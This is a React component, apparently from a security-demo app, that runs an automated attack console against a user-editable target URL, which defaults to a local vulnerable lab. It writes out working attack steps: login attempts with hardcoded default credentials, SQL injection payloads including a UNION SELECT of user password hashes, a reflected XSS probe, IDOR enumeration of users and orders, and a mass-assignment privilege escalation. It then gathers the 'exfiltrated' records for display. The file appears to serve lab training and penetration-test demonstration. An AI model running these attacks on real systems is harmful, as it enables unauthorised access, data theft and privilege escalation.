/**
 * AttackConsole.tsx
 * QuantumShield AI — Attack Console
 *
 * Automated security attack + data‑exfiltration demonstration against the
 * built‑in intentionally‑vulnerable lab (localhost:8080 / localhost:5000).
 *
 * ⚠️  AUTHORISED LAB TARGETS ONLY — do NOT point at external sites.
 */

import { useState, useRef, useEffect, useCallback } from 'react'
import {
  Terminal, Zap, ShieldOff, Database, Key, Users,
  AlertTriangle, CheckCircle2, XCircle, Copy, RefreshCw
} from 'lucide-react'
import axios from 'axios'

// ─── Types ────────────────────────────────────────────────────────────────────

interface LogEntry {
  id: number
  ts: string
  phase: Phase
  level: 'info' | 'success' | 'warning' | 'error' | 'data' | 'critical'
  msg: string
}

interface StolenRecord {
  type: string
  icon: React.ElementType
  color: string
  count: number
  sample?: string
}

type Phase =
  | 'RECON'
  | 'AUTH_BYPASS'
  | 'SQL_INJECTION'
  | 'IDOR'
  | 'CRYPTO'
  | 'DATA_EXFIL'
  | 'COMPLETE'
  | 'IDLE'

// ─── Helpers ─────────────────────────────────────────────────────────────────

let _lid = 0
function mkLog(phase: Phase, level: LogEntry['level'], msg: string): LogEntry {
  return { id: ++_lid, ts: new Date().toLocaleTimeString(), phase, level, msg }
}

const PHASE_COLOR: Record<Phase, string> = {
  IDLE:          'text-gray-500',
  RECON:         'text-cyan-400',
  AUTH_BYPASS:   'text-yellow-400',
  SQL_INJECTION: 'text-orange-400',
  IDOR:          'text-red-400',
  CRYPTO:        'text-purple-400',
  DATA_EXFIL:    'text-pink-400',
  COMPLETE:      'text-green-400',
}

const LEVEL_COLOR: Record<LogEntry['level'], string> = {
  info:     'text-gray-300',
  success:  'text-green-400',
  warning:  'text-yellow-300',
  error:    'text-red-400',
  data:     'text-pink-300',
  critical: 'text-red-500 font-bold',
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms))

// ─── Component ────────────────────────────────────────────────────────────────

export default function AttackConsole() {
  const [targetUrl, setTargetUrl] = useState('http://localhost:8080')
  const [running, setRunning]     = useState(false)
  const [done, setDone]           = useState(false)
  const [phase, setPhase]         = useState<Phase>('IDLE')
  const [logs, setLogs]           = useState<LogEntry[]>([])
  const [stolen, setStolen]       = useState<StolenRecord[]>([])
  const [progress, setProgress]   = useState(0)

  const logEndRef = useRef<HTMLDivElement>(null)
  const abortRef  = useRef<AbortController | null>(null)

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [logs])

  const addLog = useCallback((entry: LogEntry) => {
    setLogs(prev => [...prev, entry])
  }, [])

  const addStolen = useCallback((
    type: string,
    icon: React.ElementType,
    color: string,
    count: number,
    sample?: string
  ) => {
    setStolen(prev => {
      const existing = prev.find(s => s.type === type)
      if (existing) {
        return prev.map(s =>
          s.type === type
            ? { ...s, count: s.count + count, sample: sample ?? s.sample }
            : s
        )
      }
      return [...prev, { type, icon, color, count, sample }]
    })
  }, [])

  // ── PHASE 1: Recon ──────────────────────────────────────────────────────────
  async function phaseRecon(base: string, signal: AbortSignal) {
    setPhase('RECON')
    setProgress(5)
    addLog(mkLog('RECON', 'info', `🔍  Starting reconnaissance on ${base}`))
    await sleep(400)

    try {
      const r = await axios.get(`${base}/health`, { signal, timeout: 4000 })
      addLog(mkLog('RECON', 'success', `✅  Target online — ${JSON.stringify(r.data)}`))
    } catch {
      addLog(mkLog('RECON', 'warning', '⚠️  /health unreachable — trying /api/info'))
    }
    await sleep(300)

    try {
      const r = await axios.get(`${base}/api/info`, { signal, timeout: 4000 })
      const info = r.data
      addLog(mkLog('RECON', 'critical', `🔓  Information Disclosure! Framework: ${info.framework}, Debug: ${info.debug}`))
      addLog(mkLog('RECON', 'data', `   → Server: ${info.server}  DB: ${info.database}  Python: ${info.python}`))
      addStolen('Server Info', Database, 'text-orange-400', 1, JSON.stringify(info))
    } catch {
      addLog(mkLog('RECON', 'info', '   /api/info not exposed'))
    }
    await sleep(400)

    try {
      const r = await axios.get(`${base}/api/known-vulnerabilities`, { signal, timeout: 4000 })
      const vulns: any[] = Array.isArray(r.data) ? r.data : []
      addLog(mkLog('RECON', 'critical', `💀  Vuln listing endpoint exposed! ${vulns.length} known vulnerabilities returned.`))
      vulns.slice(0, 3).forEach(v =>
        addLog(mkLog('RECON', 'data', `   → [${v.severity}] ${v.type} @ ${v.endpoint}`))
      )
      addStolen('Vuln List', AlertTriangle, 'text-red-400', vulns.length, `${vulns.length} vulnerabilities enumerated`)
    } catch {
      addLog(mkLog('RECON', 'info', '   No public /api/known-vulnerabilities'))
    }

    setProgress(20)
  }

  // ── PHASE 2: Auth Bypass ────────────────────────────────────────────────────
  async function phaseAuthBypass(
    base: string,
    signal: AbortSignal
  ): Promise<{ token: string; userId: number } | null> {
    setPhase('AUTH_BYPASS')
    addLog(mkLog('AUTH_BYPASS', 'info', '🔑  Attempting authentication bypass with default credentials...'))
    await sleep(500)

    const creds = [
      { username: 'admin',  password: 'admin' },
      { username: 'admin',  password: 'Admin@lab2024' },
      { username: 'alice',  password: 'Alice@123' },
    ]

    for (const cred of creds) {
      addLog(mkLog('AUTH_BYPASS', 'info', `   Trying ${cred.username}:${cred.password}`))
      await sleep(350)
      try {
        const r = await axios.post(`${base}/api/auth/login`, cred, { signal, timeout: 5000 })
        const { token, user } = r.data
        addLog(mkLog('AUTH_BYPASS', 'critical',
          `💥  AUTH BYPASS SUCCESSFUL! Logged in as ${user?.username} (${user?.role})`))
        addLog(mkLog('AUTH_BYPASS', 'data', `   → JWT Token: ${token?.slice(0, 40)}...`))
        addStolen('Auth Token', Key, 'text-yellow-400', 1, `Bearer ${token?.slice(0, 32)}...`)
        setProgress(35)
        return { token, userId: user?.id ?? 1 }
      } catch (e: any) {
        const status = e?.response?.status
        if (status === 401) {
          addLog(mkLog('AUTH_BYPASS', 'warning', `   ✗ Invalid credentials for ${cred.username}`))
        } else {
          addLog(mkLog('AUTH_BYPASS', 'info', `   ✗ ${cred.username} failed (${status ?? 'network error'})`))
        }
      }
    }

    addLog(mkLog('AUTH_BYPASS', 'error', '   Auth bypass exhausted — proceeding unauthenticated'))
    setProgress(35)
    return null
  }

  // ── PHASE 3: SQL Injection ──────────────────────────────────────────────────
  async function phaseSQLi(base: string, signal: AbortSignal) {
    setPhase('SQL_INJECTION')
    addLog(mkLog('SQL_INJECTION', 'info', '💉  Testing SQL injection on /api/products...'))
    await sleep(400)

    const payloads = [
      `' OR 1=1--`,
      `' UNION SELECT id,username,email,password_hash,role,balance,'' FROM users--`,
    ]

    for (const payload of payloads) {
      addLog(mkLog('SQL_INJECTION', 'info', `   Payload: ${payload}`))
      await sleep(450)
      try {
        const r = await axios.get(`${base}/api/products`,
          { params: { search: payload }, signal, timeout: 5000 }
        )
        const data = Array.isArray(r.data) ? r.data : []
        if (data.length > 0) {
          addLog(mkLog('SQL_INJECTION', 'critical', `💀  SQL INJECTION CONFIRMED! ${data.length} rows returned`))
          data.slice(0, 3).forEach((row: any) => {
            const preview = Object.values(row).join(' | ')
            addLog(mkLog('SQL_INJECTION', 'data', `   → ${String(preview).slice(0, 120)}`))
          })
          addStolen('DB Records', Database, 'text-orange-500', data.length, `${data.length} rows via SQLi`)
          break
        }
      } catch (e: any) {
        addLog(mkLog('SQL_INJECTION', 'warning', `   Error: ${e?.response?.status ?? 'network'}`))
      }
    }

    await sleep(300)
    addLog(mkLog('SQL_INJECTION', 'info', '🔎  Testing /api/search for reflected XSS...'))
    try {
      const r = await axios.get(`${base}/api/search`,
        { params: { q: `<script>alert(1)</script>` }, signal, timeout: 4000 }
      )
      const body = JSON.stringify(r.data)
      if (body.includes('<script>')) {
        addLog(mkLog('SQL_INJECTION', 'critical', '⚡  REFLECTED XSS CONFIRMED — payload echoed back in response!'))
      } else {
        addLog(mkLog('SQL_INJECTION', 'success', '   XSS payload sanitised in search response'))
      }
    } catch {
      addLog(mkLog('SQL_INJECTION', 'info', '   /api/search not responding'))
    }

    setProgress(55)
  }

  // ── PHASE 4: IDOR ───────────────────────────────────────────────────────────
  async function phaseIDOR(
    base: string,
    authResult: { token: string; userId: number } | null,
    signal: AbortSignal
  ) {
    setPhase('IDOR')
    addLog(mkLog('IDOR', 'info', '🕵️  Testing IDOR on user & order endpoints...'))
    await sleep(400)

    const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}

    for (const uid of [1, 2, 3, 4, 5]) {
      await sleep(250)
      try {
        const r = await axios.get(`${base}/api/users/${uid}`, { headers, signal, timeout: 4000 })
        const u = r.data
        addLog(mkLog('IDOR', 'critical',
          `🔓  IDOR USER ${uid} → ${u.username} <${u.email}> role=${u.role} balance=$${u.balance}`))
        if (u.password_hash) {
          addLog(mkLog('IDOR', 'data', `   Password hash: ${String(u.password_hash).slice(0, 40)}...`))
          addStolen('Password Hashes', Key, 'text-red-500', 1, `${u.username}: ${String(u.password_hash).slice(0, 25)}...`)
        }
        addStolen('User PII', Users, 'text-pink-400', 1, `${u.username} | ${u.email}`)
      } catch (e: any) {
        if (e?.response?.status === 404) break
      }
    }

    await sleep(350)
    addLog(mkLog('IDOR', 'info', '🔑  Accessing /api/admin/stats WITHOUT admin token...'))
    try {
      const r = await axios.get(`${base}/api/admin/stats`, { headers, signal, timeout: 4000 })
      const stats = r.data
      addLog(mkLog('IDOR', 'critical', '💀  BROKEN ACCESS CONTROL! Admin stats returned without admin role:'))
      addLog(mkLog('IDOR', 'data', `   → ${JSON.stringify(stats).slice(0, 200)}`))
      addStolen('Admin Stats', Database, 'text-red-400', 1, JSON.stringify(stats).slice(0, 80))
    } catch (e: any) {
      const status = e?.response?.status
      addLog(mkLog('IDOR',
        status === 403 ? 'success' : 'warning',
        status === 403 ? '   ✓ Admin route correctly restricted (403)' : `   /api/admin/stats ${status ?? 'offline'}`
      ))
    }

    await sleep(300)
    addLog(mkLog('IDOR', 'info', '📦  Enumerating orders via IDOR...'))
    for (const oid of [1, 2, 3, 4]) {
      await sleep(220)
      try {
        const r = await axios.get(`${base}/api/orders/${oid}`, { headers, signal, timeout: 4000 })
        const o = r.data
        addLog(mkLog('IDOR', 'data',
          `   Order #${oid}: user_id=${o.user_id} product="${o.product}" secret="${o.secret_notes}"`))
        addStolen('Order Records', Database, 'text-orange-400', 1, o.secret_notes ?? o.product)
      } catch {
        break
      }
    }

    setProgress(72)
  }

  // ── PHASE 5: Crypto Exposure ─────────────────────────────────────────────────
  async function phaseCrypto(
    base: string,
    authResult: { token: string; userId: number } | null,
    signal: AbortSignal
  ) {
    setPhase('CRYPTO')
    addLog(mkLog('CRYPTO', 'info', '🔐  Probing cryptographic configuration endpoints...'))
    await sleep(400)

    const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}

    try {
      const r = await axios.get(`${base}/api/crypto/config`, { headers, signal, timeout: 4000 })
      const cfg = r.data
      addLog(mkLog('CRYPTO', 'critical', '💀  CRYPTOGRAPHIC CONFIG EXPOSED!'))
      const keys: any[] = Array.isArray(cfg.keys) ? cfg.keys : []
      keys.forEach(k => {
        addLog(mkLog('CRYPTO', 'data',
          `   → ${k.algorithm} (${k.key_size} bit) — ${k.quantum_vulnerable ? '⚛ QUANTUM-VULNERABLE' : 'OK'}`))
        if (k.public_key) addLog(mkLog('CRYPTO', 'data', `     Public key: ${String(k.public_key).slice(0, 50)}...`))
      })
      addStolen('Crypto Keys', Key, 'text-purple-400', keys.length || 1,
        keys.length ? `${keys.length} keys exposed` : JSON.stringify(cfg).slice(0, 60))
    } catch (e: any) {
      addLog(mkLog('CRYPTO', 'info', `   /api/crypto/config returned ${e?.response?.status ?? 'network error'}`))
    }

    if (authResult) {
      await sleep(350)
      addLog(mkLog('CRYPTO', 'info', '⚡  Testing Mass Assignment on /api/users/me (PUT)...'))
      try {
        const r = await axios.put(
          `${base}/api/users/me`,
          { role: 'admin', balance: 99999 },
          { headers, signal, timeout: 4000 }
        )
        const u = r.data
        if (u.role === 'admin' || u.balance === 99999) {
          addLog(mkLog('CRYPTO', 'critical',
            `💀  MASS ASSIGNMENT! Self-escalated to role=${u.role} balance=$${u.balance}`))
          addStolen('Privilege Escalation', Key, 'text-yellow-300', 1, 'Escalated to admin')
        } else {
          addLog(mkLog('CRYPTO', 'success', '   Mass assignment blocked (fields not updated)'))
        }
      } catch (e: any) {
        addLog(mkLog('CRYPTO', 'info', `   Mass assignment attempt: ${e?.response?.status ?? 'network error'}`))
      }
    }

    setProgress(88)
  }

  // ── PHASE 6: Summary ─────────────────────────────────────────────────────────
  async function phaseDataExfil() {
    setPhase('DATA_EXFIL')
    addLog(mkLog('DATA_EXFIL', 'info', '📤  Aggregating exfiltrated data...'))
    await sleep(600)
    addLog(mkLog('DATA_EXFIL', 'critical', '🏴  ATTACK COMPLETE — Data exfiltration summary compiled above.'))
    setProgress(100)
    setPhase('COMPLETE')
    setDone(true)
  }

  // ── Master orchestrator ──────────────────────────────────────────────────────
  const launchAttack = async () => {
    if (running) return
    const base = targetUrl.replace(/\/$/, '')
    setRunning(true)
    setDone(false)
    setLogs([])
    setStolen([])
    setProgress(0)
    setPhase('RECON')

    const ctrl = new AbortController()
    abortRef.current = ctrl
    const { signal } = ctrl

    try {
      addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
      addLog(mkLog('RECON', 'warning', `⚠️   AUTHORIZED LAB ATTACK — Target: ${base}`))
      addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
      await sleep(300)

      await phaseRecon(base, signal)
      const authResult = await phaseAuthBypass(base, signal)
      await phaseSQLi(base, signal)
      await phaseIDOR(base, authResult, signal)
      await phaseCrypto(base, authResult, signal)
      await phaseDataExfil()
    } catch (err: any) {
      if (axios.isCancel(err) || err?.name === 'CanceledError' || err?.name === 'AbortError') {
        addLog(mkLog(phase, 'warning', '🛑  Attack aborted by user'))
      } else {
        addLog(mkLog(phase, 'error', `Fatal error: ${err?.message}`))
      }
    } finally {
      setRunning(false)
    }
  }

  const abort = () => {
    abortRef.current?.abort()
    setRunning(false)
  }

  const reset = () => {
    abort()
    setLogs([])
    setStolen([])
    setProgress(0)
    setPhase('IDLE')
    setDone(false)
  }

  const PHASES: [Phase, string][] = [
    ['RECON',         'Reconnaissance'],
    ['AUTH_BYPASS',   'Auth Bypass'],
    ['SQL_INJECTION', 'SQL Injection'],
    ['IDOR',          'IDOR / Data Exfil'],
    ['CRYPTO',        'Crypto Exposure'],
    ['DATA_EXFIL',    'Summary'],
  ]
  const PHASE_ORDER: Phase[] = ['RECON','AUTH_BYPASS','SQL_INJECTION','IDOR','CRYPTO','DATA_EXFIL','COMPLETE']

  // ─── Render ────────────────────────────────────────────────────────────────
  return (
    <div className="p-6 space-y-5 min-h-screen">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-red-500/20 border border-red-500/40 flex items-center justify-center">
            <ShieldOff size={22} className="text-red-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
              Attack Console
              {running && (
                <span className="inline-flex items-center gap-1.5 text-xs px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30 animate-pulse">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-400" /> LIVE
                </span>
              )}
            </h1>
            <p className="text-xs text-gray-500">Automated multi-phase penetration attack · Authorized lab targets only</p>
          </div>
        </div>
        <button onClick={reset} className="qs-btn-secondary text-xs gap-1.5">
          <RefreshCw size={13} /> Reset
        </button>
      </div>

      {/* Warning */}
      <div className="qs-card border-yellow-500/30 bg-yellow-500/5 py-3">
        <div className="flex items-start gap-2.5">
          <AlertTriangle size={16} className="text-yellow-400 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-yellow-200/80">
            <strong className="text-yellow-300">Authorized targets only.</strong>{' '}
            This console executes real HTTP attacks against the configured URL.
            Only use with your local <code className="bg-black/30 px-1 rounded">localhost:8080</code> vulnerable lab.
          </p>
        </div>
      </div>

      {/* Target + Launch */}
      <div className="qs-card border-red-500/20">
        <div className="flex items-end gap-3">
          <div className="flex-1">
            <label className="block text-xs text-gray-500 mb-1.5 font-mono">TARGET URL</label>
            <input
              id="attack-target-url"
              type="url"
              className="qs-input font-mono text-sm w-full"
              placeholder="http://localhost:8080"
              value={targetUrl}
              disabled={running}
              onChange={e => setTargetUrl(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && !running && launchAttack()}
            />
          </div>
          {!running ? (
            <button
              id="launch-attack-btn"
              onClick={launchAttack}
              className="flex items-center gap-2 px-5 py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-white font-semibold text-sm transition-all duration-200 shadow-lg shadow-red-900/30"
            >
              <Zap size={16} /> LAUNCH ATTACK
            </button>
          ) : (
            <button
              onClick={abort}
              className="flex items-center gap-2 px-5 py-2.5 rounded-lg bg-gray-700 hover:bg-gray-600 text-white font-semibold text-sm transition-all"
            >
              <XCircle size={16} /> ABORT
            </button>
          )}
        </div>

        {(running || done) && (
          <div className="mt-4">
            <div className="flex items-center justify-between mb-1.5">
              <span className={`text-xs font-mono font-bold ${PHASE_COLOR[phase]}`}>[{phase}]</span>
              <span className="text-xs text-gray-500 font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="h-1.5 bg-gray-800 rounded-full overflow-hidden">
              <div
                className="h-1.5 bg-gradient-to-r from-red-500 via-orange-400 to-yellow-400 rounded-full transition-all duration-500"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}
      </div>

      {/* Main content */}
      <div className="grid grid-cols-1 xl:grid-cols-3 gap-5">
        {/* Terminal */}
        <div className="xl:col-span-2 qs-card p-0 overflow-hidden flex flex-col" style={{ minHeight: 480 }}>
          <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-800 bg-gray-900/60">
            <div className="flex items-center gap-2">
              <Terminal size={14} className="text-green-400" />
              <span className="text-xs font-mono text-green-400 font-semibold">attack-terminal</span>
            </div>
            <button
              className="text-gray-600 hover:text-gray-400 transition-colors"
              title="Copy log"
              onClick={() =>
                navigator.clipboard.writeText(
                  logs.map(l => `[${l.ts}][${l.phase}] ${l.msg}`).join('\n')
                )
              }
            >
              <Copy size={13} />
            </button>
          </div>

          <div
            className="flex-1 overflow-y-auto bg-[#0a0c10] p-4 font-mono text-xs leading-6 space-y-0.5"
            style={{ maxHeight: 500 }}
          >
            {logs.length === 0 ? (
              <div className="text-gray-700 select-none">
                <div>┌───────────────────────────────────────────────────────┐</div>
                <div>│  Enter a target URL and press LAUNCH ATTACK            │</div>
                <div>│  All attacks run against the local vulnerable lab.    │</div>
                <div>└───────────────────────────────────────────────────────┘</div>
              </div>
            ) : (
              logs.map(entry => (
                <div key={entry.id} className="flex gap-2">
                  <span className="text-gray-700 flex-shrink-0 w-20">[{entry.ts}]</span>
                  <span className={`flex-shrink-0 w-24 ${PHASE_COLOR[entry.phase]}`}>
                    [{entry.phase.slice(0, 8)}]
                  </span>
                  <span className={LEVEL_COLOR[entry.level]}>{entry.msg}</span>
                </div>
              ))
            )}
            {running && (
              <div className="flex gap-2 mt-1">
                <span className="text-gray-700 w-20">[{new Date().toLocaleTimeString()}]</span>
                <span className={`w-24 ${PHASE_COLOR[phase]}`}>[{phase.slice(0, 8)}]</span>
                <span className="text-green-400 animate-pulse">▍</span>
              </div>
            )}
            <div ref={logEndRef} />
          </div>
        </div>

        {/* Right panel */}
        <div className="flex flex-col gap-4">
          {/* Stolen data */}
          <div className="qs-card flex-1">
            <div className="flex items-center gap-2 mb-4">
              <Database size={15} className="text-pink-400" />
              <h3 className="text-sm font-semibold text-white">Exfiltrated Data</h3>
              {stolen.length > 0 && (
                <span className="ml-auto text-xs font-mono px-2 py-0.5 rounded-full bg-pink-500/20 text-pink-400 border border-pink-500/20">
                  {stolen.reduce((a, s) => a + s.count, 0)} records
                </span>
              )}
            </div>

            {stolen.length === 0 ? (
              <div className="text-center py-10 text-gray-700 text-xs">
                <Database size={32} className="mx-auto mb-3 opacity-20" />
                No data captured yet
              </div>
            ) : (
              <div className="space-y-2.5">
                {stolen.map((s, i) => {
                  const Icon = s.icon
                  return (
                    <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-gray-900/60 border border-gray-800">
                      <div className={`w-8 h-8 rounded-lg flex items-center justify-center bg-black/40 flex-shrink-0 ${s.color}`}>
                        <Icon size={15} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-semibold text-white">{s.type}</span>
                          <span className="text-xs font-mono text-red-400">{s.count}</span>
                        </div>
                        {s.sample && (
                          <div className="text-xs text-gray-600 truncate mt-0.5 font-mono">{s.sample}</div>
                        )}
                      </div>
                    </div>
                  )
                })}
              </div>
            )}
          </div>

          {/* Phase checklist */}
          <div className="qs-card">
            <h3 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3">Attack Phases</h3>
            <div className="space-y-2">
              {PHASES.map(([p, label]) => {
                const currentIdx = PHASE_ORDER.indexOf(phase)
                const thisIdx = PHASE_ORDER.indexOf(p)
                const isDone = currentIdx > thisIdx
                const isActive = phase === p && running

                return (
                  <div key={p} className="flex items-center gap-2.5">
                    {isDone ? (
                      <CheckCircle2 size={14} className="text-green-400 flex-shrink-0" />
                    ) : isActive ? (
                      <div className="w-3.5 h-3.5 rounded-full border-2 border-orange-400 border-t-transparent animate-spin flex-shrink-0" />
                    ) : (
                      <div className="w-3.5 h-3.5 rounded-full border border-gray-700 flex-shrink-0" />
                    )}
                    <span className={`text-xs ${isDone ? 'text-green-400' : isActive ? PHASE_COLOR[p] : 'text-gray-600'}`}>
                      {label}
                    </span>
                  </div>
                )
              })}
            </div>
          </div>
        </div>
      </div>

      {/* Done banner */}
      {done && (
        <div className="qs-card border-green-500/30 bg-green-500/5 flex items-center gap-3 py-4">
          <CheckCircle2 size={20} className="text-green-400 flex-shrink-0" />
          <div>
            <div className="font-semibold text-green-300 text-sm">Attack sequence complete</div>
            <div className="text-xs text-gray-500 mt-0.5">
              {stolen.reduce((a, s) => a + s.count, 0)} records captured across {stolen.length} categories.
              All findings visible in Findings + Scans.
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
